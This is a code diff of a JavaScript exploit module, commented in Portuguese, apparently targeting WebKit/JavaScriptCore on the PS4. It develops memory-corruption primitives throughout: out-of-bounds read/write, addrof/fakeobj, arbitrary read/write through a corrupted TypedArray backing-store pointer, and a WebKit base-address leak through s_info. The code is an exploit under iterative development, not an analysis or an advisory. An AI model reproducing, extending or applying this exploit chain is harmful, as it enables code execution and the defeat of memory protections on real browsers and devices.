@@ -1,7 +1,10 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v133 - R93 Importar getOOBAllocationSize)
+// js/script3/testArrayBufferVictimCrash.mjs (v134 - R94 Reabilitar Addrof para arb_rw_array na Fase 5)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Corrigido ReferenceError para getOOBAllocationSize, importando-o de core_exploit.mjs.
+// - Reabilita o uso pontual da primitiva 'addrof_func' na Fase 5, especificamente
+//   para obter o endereço do 'arb_rw_array' (o TypedArray a ser corrompido).
+// - Isso é feito porque a alocação de heap não é previsível por offsets fixos.
+// - Se 'addrof_func' funcionar para TypedArrays, a primitiva de L/E estável será construída.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -11,12 +14,12 @@ import {
     getOOBDataView,
     oob_read_absolute, 
     oob_write_absolute,
-    getOOBAllocationSize // NOVO: Importado getOOBAllocationSize
+    getOOBAllocationSize 
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v133_R93_ImportOOBSize";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v134_R94_ReenableAddrofForTypedArray";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -40,7 +43,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store SEM Addrof na Fase 5 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Reabilitação de Addrof para TypedArray ---`, "test");
 
     let final_result = {
         success: false,
@@ -48,7 +51,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         webkit_base_addr: null
     };
 
-    // Primitivas de addrof/fakeobj (usadas APENAS na Fase 4, NÃO na Fase 5)
+    // Primitivas de addrof/fakeobj
     let confused_array;
     let victim_array;
     let addrof_func;
@@ -61,11 +64,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let arb_read_stable = null;
     let arb_write_stable = null;
 
-    // Definir a constante localmente, já que não pode ser importada de core_exploit
+    // NOVO: Definir a constante localmente, já que não pode ser importada de core_exploit
     const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
 
     try {
-        // Helper para definir as primitivas addrof/fakeobj (usadas APENAS na Fase 4)
+        // Helper para definir as primitivas addrof/fakeobj. Será chamada UMA VEZ para Fase 4.
+        // Será re-chamada ou suas referências limpas/reutilizadas para Fase 5.
         const setupAddrofFakeobj = () => {
             confused_array = [13.37]; 
             victim_array = [{ dummy: 0 }]; 
@@ -86,7 +90,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await triggerOOB_primitive({ force_reinit: true }); 
         if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");
 
-        setupAddrofFakeobj(); 
+        setupAddrofFakeobj(); // Configura as primitivas addrof/fakeobj APENAS UMA VEZ
         
         let leaker_phase4 = { obj_prop: null, val_prop: 0 };
         const arb_read_phase4 = (addr, size_bytes = 8) => { 
@@ -130,61 +134,60 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         await PAUSE_S3(50); 
 
         // ============================================================================
-        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL SEM addrof_func
+        // INÍCIO FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (USANDO ADDROF PARA TYPEDARRAY)
         // ============================================================================
-        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (SEM addrof_func) ---", "subtest");
+        logS3("--- FASE 5: CONSTRUINDO PRIMITIVA DE L/E ESTÁVEL (USANDO ADDROF PARA TYPEDARRAY) ---", "subtest");
         
-        // Zera as referências das primitivas addrof/fakeobj da Fase 4 para evitar contaminação.
-        confused_array = null;
-        victim_array = null;
-        addrof_func = null; // Garante que não será usada.
-        fakeobj_func = null; // Garante que não será usada.
+        // Zera as referências das primitivas addrof/fakeobj da Fase 4 (leaker_phase4).
+        // addrof_func e fakeobj_func (e seus arrays internos) NÃO SÃO zerados, mas reutilizados.
         leaker_phase4 = null; 
-        
+        await PAUSE_S3(200); 
+
+        logS3("Ambiente OOB existente será reutilizado. Primitivas addrof/fakeobj da Fase 4 serão reutilizadas.", "good");
+
+        // Warm-up NÃO É NECESSÁRIO aqui, pois as primitivas são as mesmas da Fase 4.
+        logS3("--- Warm-up: PULADO, Primitivas da Fase 4 estão sendo reutilizadas. ---", "info");
+        await PAUSE_S3(50); 
+
         // Criar o arb_rw_array. Ele será alocado no heap.
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
-        // ATENÇÃO: ESTE É O PONTO CRÍTICO. PRECISAMOS ACHAR O ENDEREÇO DO ARB_RW_ARRAY SEM ADDROF.
-        // ASSUMIR UMA LOCALIZAÇÃO RELATIVA:
-        // Isso é altamente dependente do alocador de heap e é especulativo.
-        // Para testes, vamos assumir que ele está em um offset fixo conhecido do oob_array_buffer_real.
-        const ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER = 0x800; // <<<< ESTE VALOR É UM CHUTE. PRECISA SER VALIDADO.
-                                                             // Sugere que arb_rw_array é alocado a ~2KB do início do OOB.
-                                                             // Ou é o offset da sua ArrayBufferView dentro do OOB.
-
-        const arb_rw_array_ab_view_addr_in_oob_buffer = ARB_RW_ARRAY_BASE_OFFSET_IN_OOB_BUFFER;
-
-        // Validar que o offset do ArrayBufferView é razoável (deve estar dentro do oob_array_buffer_real)
-        if (arb_rw_array_ab_view_addr_in_oob_buffer < OOB_DV_METADATA_BASE_IN_OOB_BUFFER || 
-            arb_rw_array_ab_view_addr_in_oob_buffer >= getOOBAllocationSize()) { // getOOBAllocationSize está agora importado
-            throw new Error(`FALHA CRÍTICA: Offset assumido para arb_rw_array_ab_view_addr_in_oob_buffer (${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)}) é irrealista para o oob_array_buffer_real (tamanho total ${getOOBAllocationSize()}).`);
-        }
-        logS3(`    Assumindo que ArrayBufferView de arb_rw_array está em offset ${toHex(arb_rw_array_ab_view_addr_in_oob_buffer)} no oob_array_buffer_real.`, "warn");
-
-        const arb_rw_array_m_vector_orig_ptr_in_oob = arb_rw_array_ab_view_addr_in_oob_buffer + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const arb_rw_array_m_length_orig_ptr_in_oob = arb_rw_array_ab_view_addr_in_oob_buffer + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
+        // OBTEM O ENDEREÇO DO ARRAYBUFFERVIEW DE arb_rw_array USANDO addrof_func.
+        // Acreditamos que addrof_func é mais estável para TypedArrays.
+        const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array); 
+        logS3(`    Endereço do ArrayBufferView de arb_rw_array (obtido via addrof_func): ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
         
-        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, 8);
-        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 4);
+        // Validação crucial: o endereço deve ser um ponteiro de userland (0x7FFF...)
+        if (arb_rw_array_ab_view_addr.equals(AdvancedInt64.Zero) || (arb_rw_array_ab_view_addr.high() >>> 16) !== 0x7FFF) {
+            throw new Error(`FALHA CRÍTICA: addrof_func para arb_rw_array falhou ou retornou endereço inválido (${arb_rw_array_ab_view_addr.toString(true)}). Não é possível construir L/E arbitrária.`);
+        }
+        logS3(`    Addrof de arb_rw_array bem-sucedido e endereço válido.`, "good");
+
+
+        const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
+        const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
+        
+        const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
+        const original_m_length = oob_read_absolute(arb_rw_array_m_length_orig_ptr_addr, 4);
 
         logS3(`    Original m_vector de arb_rw_array (lido via OOB): ${original_m_vector.toString(true)}`, "info");
         logS3(`    Original m_length de arb_rw_array (lido via OOB): ${toHex(original_m_length)}`, "info");
 
-        // Precisamos verificar se original_m_vector E original_m_length parecem válidos
-        // antes de prosseguir. Um m_vector deve ser um ponteiro para o heap JS (não zero, 0x7FFF...).
+        // Validação extra: o m_vector deve ser um ponteiro válido para o heap JS (0x7FFF...)
         if (original_m_vector.equals(AdvancedInt64.Zero) || (original_m_vector.high() >>> 16) !== 0x7FFF) {
-            throw new Error(`FALHA CRÍTICA: m_vector lido do arb_rw_array (${original_m_vector.toString(true)}) é inválido. O offset assumido para arb_rw_array pode estar incorreto.`);
+            throw new Error(`FALHA CRÍTICA: m_vector original do arb_rw_array (${original_m_vector.toString(true)}) é inválido. Corrupção de backing store não será confiável.`);
         }
-        if (original_m_length === 0) { 
-             logS3(`    ALERTA: m_length de arb_rw_array é zero. Isso é inesperado para um ArrayBuffer alocado.`, "warn");
-             throw new Error(`FALHA CRÍTICA: m_length de arb_rw_array é zero. Isso indica que o offset assumido está incorreto, ou o ArrayBuffer não foi alocado corretamente.`);
+        // O m_length deve ser o tamanho original (0x1000)
+        if (original_m_length !== 0x1000) {
+            throw new Error(`FALHA CRÍTICA: m_length original do arb_rw_array (${toHex(original_m_length)}) é inesperado (esperado 0x1000).`);
         }
 
 
         arb_read_stable = (address, size_bytes) => {
-            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, address, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 0xFFFFFFFF, 4); 
+            // Primeiro, corromper o m_vector e m_length do arb_rw_array
+            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 
 
             let result;
             const dv = new DataView(arb_rw_array.buffer); 
@@ -194,14 +197,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
             else throw new Error("Tamanho de leitura inválido para arb_read_stable.");
 
-            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, original_m_vector, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, original_m_length, 4);
+            // Restaurar os valores originais imediatamente após a operação
+            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
             return result;
         };
 
         arb_write_stable = (address, value, size_bytes) => {
-            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, address, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, 0xFFFFFFFF, 4); 
+            // Primeiro, corromper o m_vector e m_length do arb_rw_array
+            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 
 
             const dv = new DataView(arb_rw_array.buffer); 
             if (size_bytes === 1) arb_rw_array[0] = value;
@@ -210,8 +215,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             else if (size_bytes === 8) dv.setFloat64(0, int64ToDouble(value), true);
             else throw new Error("Tamanho de escrita inválido para arb_write_stable.");
 
-            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_in_oob, original_m_vector, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_in_oob, original_m_length, 4);
+            // Restaurar os valores originais imediatamente após a operação
+            oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, original_m_vector, 8);
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, original_m_length, 4);
         };
         logS3("Primitivas de L/E estáveis (arb_read_stable, arb_write_stable) construídas com sucesso.", "good");
         await PAUSE_S3(50);
@@ -222,21 +228,27 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // ============================================================================
         logS3("--- FASE 6: VAZAMENTO DE WEBKIT BASE LENDO DE SÍMBOLO GLOBAL CONHECIDO (com arb_read_stable) ---", "subtest");
         
-        const assumed_webkit_base = new AdvancedInt64(WEBKIT_LIBRARY_INFO.JSC_OFFSETS.ASSUMED_WEBKIT_BASE_FOR_TEST); // Corrigir JSC_OFFSETS aqui para WEBKIT_LIBRARY_INFO
+        // Usamos um endereço base da WebKit APENAS para testar se arb_read_stable funciona fora do heap OOB.
+        // ESTE ENDEREÇO É ALTAMENTE ESPECULATIVO E PRECISA SER VALIDADO POR ENGENHARIA REVERSA PARA A PS4 12.02.
+        const assumed_webkit_base = new AdvancedInt64(WEBKIT_LIBRARY_INFO.ASSUMED_WEBKIT_BASE_FOR_TEST); 
         logS3(`[ASSUNÇÃO] Usando base da WebKit assumida para teste: ${assumed_webkit_base.toString(true)}`, "warn");
 
         const s_info_offset = new AdvancedInt64(WEBKIT_LIBRARY_INFO.DATA_OFFSETS["JSC::JSArrayBufferView::s_info"]);
         const s_info_address = assumed_webkit_base.add(s_info_offset);
         logS3(`[Etapa 1] Endereço de JSC::JSArrayBufferView::s_info (assumido): ${s_info_address.toString(true)}`, "info");
 
+        // Agora, tente ler um QWORD (ponteiro) do s_info usando a primitiva estável.
         const s_info_val = arb_read_stable(s_info_address, 8); 
         logS3(`[Etapa 2] Valor lido de JSC::JSArrayBufferView::s_info: ${s_info_val.toString(true)}`, "leak");
 
+        // Validação: O valor lido deve ser um ponteiro válido para a WebKit (0x7FFF...)
         if (s_info_val.equals(AdvancedInt64.Zero) || (s_info_val.high() >>> 16) !== 0x7FFF) {
             throw new Error(`FALHA CRÍTICA: Leitura de JSC::JSArrayBufferView::s_info retornou um valor inválido (${s_info_val.toString(true)}). A base assumida ou o offset estão incorretos, ou a primitiva de L/E não pode ler fora do heap JS.`);
         }
         logS3(`[Etapa 2] Leitura de s_info bem-sucedida! Isso confirma que a primitiva de L/E pode ler em endereços arbitrários.`, "good");
 
+        // Calcular o endereço base da WebKit.
+        // A lógica de cálculo: webkit_base_addr = s_info_val - offset_de_s_info_na_lib_webkit
         const webkit_base_addr = s_info_val.sub(s_info_offset); 
         final_result.webkit_base_addr = webkit_base_addr.toString(true);
 
